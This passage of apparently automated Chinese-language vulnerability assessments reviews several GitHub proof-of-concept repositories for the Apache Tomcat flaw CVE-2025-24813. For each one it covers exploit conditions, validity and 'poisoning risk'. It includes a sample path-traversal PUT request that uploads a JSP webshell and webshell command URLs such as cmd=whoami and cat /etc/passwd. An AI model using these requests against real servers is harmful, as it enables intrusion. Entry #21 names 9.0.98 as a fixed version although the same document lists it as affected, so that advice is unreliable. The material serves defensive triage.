**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

